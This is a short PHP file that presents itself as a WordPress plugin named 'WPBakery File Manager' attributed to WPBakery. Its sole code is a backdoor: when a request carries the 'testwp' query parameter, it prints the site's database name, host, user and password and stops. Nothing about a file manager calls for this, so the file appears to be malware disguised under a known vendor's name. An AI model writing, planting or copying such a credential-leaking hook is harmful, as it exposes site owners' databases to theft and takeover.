<?php

/**
 * Plugin Name: WPBakery File Manager
 * Plugin Author: WPBakery
 * Version: 1.0
 */	

if(isset($_GET['testwp'])) {
	var_export([
		DB_NAME,
		DB_HOST,
		DB_USER,
		DB_PASSWORD
	]);
	die;
}